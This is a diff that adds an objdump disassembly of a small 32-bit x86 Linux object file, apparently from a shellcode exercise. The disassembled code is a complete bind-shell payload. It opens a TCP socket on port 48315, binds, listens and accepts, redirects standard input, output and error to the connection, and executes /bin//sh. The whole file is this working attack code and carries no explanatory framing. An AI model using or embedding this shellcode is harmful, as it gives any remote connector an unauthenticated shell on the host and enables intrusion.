@@ -1,0 +1,66 @@
+
+port_bind_asm_my_mods_test_by_section.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:	31 c0                	xor    %eax,%eax
+   2:	31 db                	xor    %ebx,%ebx
+   4:	31 d2                	xor    %edx,%edx
+   6:	50                   	push   %eax
+   7:	6a 01                	push   $0x1
+   9:	6a 02                	push   $0x2
+   b:	89 e1                	mov    %esp,%ecx
+   d:	fe c3                	inc    %bl
+   f:	b0 66                	mov    $0x66,%al
+  11:	cd 80                	int    $0x80
+  13:	89 c6                	mov    %eax,%esi
+  15:	52                   	push   %edx
+  16:	66 68 bc bb          	pushw  $0xbbbc
+  1a:	66 6a 02             	pushw  $0x2
+  1d:	89 e1                	mov    %esp,%ecx
+  1f:	6a 10                	push   $0x10
+  21:	51                   	push   %ecx
+  22:	56                   	push   %esi
+  23:	89 e1                	mov    %esp,%ecx
+  25:	43                   	inc    %ebx
+  26:	31 c0                	xor    %eax,%eax
+  28:	b0 66                	mov    $0x66,%al
+  2a:	cd 80                	int    $0x80
+  2c:	52                   	push   %edx
+  2d:	56                   	push   %esi
+  2e:	89 e1                	mov    %esp,%ecx
+  30:	b3 04                	mov    $0x4,%bl
+  32:	b0 66                	mov    $0x66,%al
+  34:	cd 80                	int    $0x80
+  36:	31 d2                	xor    %edx,%edx
+  38:	52                   	push   %edx
+  39:	52                   	push   %edx
+  3a:	56                   	push   %esi
+  3b:	89 e1                	mov    %esp,%ecx
+  3d:	43                   	inc    %ebx
+  3e:	31 c0                	xor    %eax,%eax
+  40:	b0 66                	mov    $0x66,%al
+  42:	cd 80                	int    $0x80
+  44:	89 c3                	mov    %eax,%ebx
+  46:	31 c9                	xor    %ecx,%ecx
+  48:	b0 3f                	mov    $0x3f,%al
+  4a:	cd 80                	int    $0x80
+  4c:	41                   	inc    %ecx
+  4d:	b0 3f                	mov    $0x3f,%al
+  4f:	cd 80                	int    $0x80
+  51:	41                   	inc    %ecx
+  52:	b0 3f                	mov    $0x3f,%al
+  54:	cd 80                	int    $0x80
+  56:	31 c0                	xor    %eax,%eax
+  58:	50                   	push   %eax
+  59:	68 6e 2f 73 68       	push   $0x68732f6e
+  5e:	68 2f 2f 62 69       	push   $0x69622f2f
+  63:	89 e3                	mov    %esp,%ebx
+  65:	50                   	push   %eax
+  66:	53                   	push   %ebx
+  67:	89 e1                	mov    %esp,%ecx
+  69:	31 d2                	xor    %edx,%edx
+  6b:	b0 0b                	mov    $0xb,%al
+  6d:	cd 80                	int    $0x80
